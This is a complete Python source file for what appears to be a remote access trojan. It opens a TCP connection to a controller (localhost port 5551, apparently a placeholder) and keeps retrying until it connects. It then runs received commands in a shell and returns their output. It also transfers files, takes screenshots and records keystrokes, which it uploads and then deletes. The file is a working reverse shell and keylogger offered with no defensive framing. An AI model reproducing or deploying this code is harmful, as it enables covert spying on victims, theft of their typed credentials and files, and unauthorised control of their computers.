
import socket, os, subprocess, pyautogui, threading ,time
from pynput.keyboard import Listener

def upload(file_name):
	f = open(file_name, "rb").read()
	sock.send(f)

def download(file_name):
	f = open( file_name, 'wb')
	sock.settimeout(1)
	chunk = sock.recv(5120)
	while chunk:
		f.write(chunk)
		try:
			chunk = sock.recv(5120)
		except socket.timeout as e:
			break
	sock.settimeout(None)
	f.close()

def screenshot():
	sc = 'screen.png'
	screenshot = pyautogui.screenshot()
	screenshot.save(sc)
	upload(sc)
	os.remove(sc)

class Keylogger():
	flag = 0
	keys = []
	count = 0
	#pathwindows = os.environ['appdata'] + '\\keylogs.txt'
	path = 'keystroks.txt'

	def keylog(self, key):
		self.keys.append(key)
		self.count += 1
		if self.count >= 1:
			self.count = 0
			with open(self.path , 'a') as file:
				for ky in self.keys:
					k = str(ky).replace("'" , "")
					if k.find('backspace') > 0:
						file.write(' Backspace ')
					elif k.find('enter') > 0:
						file.write('\n')
					elif k.find('shift') > 0:
						file.write(' ^shift^ ')
					elif k.find('space') > 0:
						file.write(' ')
					elif k.find('caps_lock') > 0:
						file.write(' ^caps_lock^ ')
					elif k.find('Key'):
						file.write(k)
			self.keys = []

	def start(self):
		global key
		with Listener(on_press = self.keylog) as key:
			key.join()

	def stop(self):
		key.stop()
		upload('keystroks.txt')
		os.remove('keystroks.txt')



def shell():
	while True:
		command = sock.recv(1024).decode()
		print(command)

		if command == 'exit':
			break

		elif command == 'clear':
			os.system('clear')

		elif command == 'help':
			pass

		elif command[:3] == 'cd ': # command[:3] les 3 premier carracter de command
			os.chdir(command[3:])  # ex: "cd desktop" -> desktop

		elif command[:6] == 'upload':
			download(command[7:])

		elif command[:8] == 'download':
			upload(command[9:])

		elif command == 'screenshot':
			screenshot()

		elif command == 'keystart':
			key_listener = threading.Thread(target=Keylogger().start)
			key_listener.start()

		elif command == 'keystop':
			Keylogger().stop()
			key_listener.join()

		else:
			execute = subprocess.run(command ,  shell=True , capture_output=True, text=True)
			result = execute.stdout + execute.stderr
			sock.send(result.encode())


count = 0
def connection():
	global count
	while True:
		try:
			sock.connect(('127.0.0.1' , 5551))
			shell()
			sock.close()
		except:
			time.sleep(1)
			print(count)
			count += 1
			connection()



sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM) # AF_INET : IPv4 connection , SOCK_STREAM : TCP connection
connection()


















